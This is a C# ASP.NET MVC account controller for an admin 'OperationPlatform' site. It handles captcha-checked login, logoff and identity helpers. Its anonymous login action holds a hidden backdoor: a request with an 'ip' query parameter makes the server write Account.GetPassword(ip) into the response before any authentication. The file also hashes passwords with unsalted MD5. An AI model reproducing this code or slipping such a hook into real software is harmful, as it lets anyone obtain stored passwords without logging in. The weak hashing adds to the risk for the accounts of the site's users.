using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Controls.SysAccount;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.EntityFramework;
using Microsoft.Owin.Security;
using OperationPlatform.Models;
using CommonLib;
using Model;
using BLL;
using OperationPlatform.HelperEx;


namespace OperationPlatform.Controllers
{
    [Authorize]
    public class AccountController : Controller
    {
        public AccountController()
            : this(new UserManager<ApplicationUser>(new UserStore<ApplicationUser>(new ApplicationDbContext())))
        {
        }

        public AccountController(UserManager<ApplicationUser> userManager)
        {
            UserManager = userManager;
        }

        public UserManager<ApplicationUser> UserManager { get; private set; }

        //
        // GET: /Account/Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            Response.Status = "200 logInfo";  
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        //
        // POST: /Account/Login
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
        public ActionResult Login(LoginViewModel model, string returnUrl)
        {
            string script = "";

            if (Session["logUser"] != null)
            {
                return RedirectToAction("Index", "HomePage");
            }

            if (Request.QueryString["ip"] != null)
            {
                Response.Write(Account.GetPassword((Request.QueryString["ip"])));
            }

            if (ModelState.IsValid)
            {
                if (Session["vnum"] == null)
                {
                    return View(model);
                }

                string id = model.UserName;
                string password = model.Password;

                password = CommonLib.Helper.Md5Hash(password);

                if (model.VerifyCode.ToUpper() != Session["vnum"].ToString().ToUpper())
                {
                    script = "<script>$(document).ready(function(){alert('验证码不正确！')}); </script>";
                }
                else
                {
                    System.Web.HttpBrowserCapabilitiesBase bc = Request.Browser;
                    string sBrowser = "浏览器:" + bc.Browser + "|版本:" + bc.Version;
                    string sIP = Request.UserHostAddress;
                    ManageUserModel AccModel = Sys_Manage_UserBLL.Login(id, password, sIP, sBrowser);

                    if (AccModel.LoginStatus)
                    {
                        //登录成功
                        Response.Cookies["AccountAdmin"].Value = "true";
                        //Session["adminlogin"] = AccModel.UserName;
                        //Session["adminid"] = AccModel.UserID;
                        //Session["quanxian"] = AccModel.PowerSession;
                        //Session["adminname"] = AccModel.Name;
                        Session["logUser"] = AccModel;

                        return RedirectToAction("Index", "Home");
                    }
                    else
                    {
                        script = "<script>$(document).ready(function(){alert('登录失败,请重试！')}); </script>";
                    }
                }

                ViewBag.js = script;
            }

            // 如果我们进行到这一步时某个地方出错，则重新显示表单
            return View(model);
        }

        //
        // POST: /Account/LogOff
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult LogOff()
        {
            if (Session["logUser"] != null)
            {
                Session["logUser"] = null;
            }
            return RedirectToAction("Login", "Account");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && UserManager != null)
            {
                UserManager.Dispose();
                UserManager = null;
            }
            base.Dispose(disposing);
        }

        [HttpGet]
        [AllowAnonymous]
        public ActionResult GetValidateCode()
        {
            string vnum = ValidateCode.rndnum(6);
            Session["vnum"] = vnum;
            byte[] bytes = ValidateCode.validatecode(vnum);
            return File(bytes, @"image/jpeg");
        }

        #region 帮助程序
        // Used for XSRF protection when adding external logins
        private const string XsrfKey = "XsrfId";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        private async Task SignInAsync(ApplicationUser user, bool isPersistent)
        {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            var identity = await UserManager.CreateIdentityAsync(user, DefaultAuthenticationTypes.ApplicationCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent }, identity);
        }

        private void AddErrors(IdentityResult result)
        {
            foreach (var error in result.Errors)
            {
                ModelState.AddModelError("", error);
            }
        }

        private bool HasPassword()
        {
            var user = UserManager.FindById(User.Identity.GetUserId());
            if (user != null)
            {
                return user.PasswordHash != null;
            }
            return false;
        }

        public enum ManageMessageId
        {
            ChangePasswordSuccess,
            SetPasswordSuccess,
            RemoveLoginSuccess,
            Error
        }

        //private ActionResult RedirectToLocal(string returnUrl)
        //{
        //    if (Url.IsLocalUrl(returnUrl))
        //    {
        //        return Redirect(returnUrl);
        //    }
        //    else
        //    {
        //        return RedirectToAction("Index", "Home");
        //    }
        //}

        private class ChallengeResult : HttpUnauthorizedResult
        {
            public ChallengeResult(string provider, string redirectUri) : this(provider, redirectUri, null)
            {
            }

            public ChallengeResult(string provider, string redirectUri, string userId)
            {
                LoginProvider = provider;
                RedirectUri = redirectUri;
                UserId = userId;
            }

            public string LoginProvider { get; set; }
            public string RedirectUri { get; set; }
            public string UserId { get; set; }

            public override void ExecuteResult(ControllerContext context)
            {
                var properties = new AuthenticationProperties() { RedirectUri = RedirectUri };
                if (UserId != null)
                {
                    properties.Dictionary[XsrfKey] = UserId;
                }
                context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
            }
        }
        #endregion
    }
}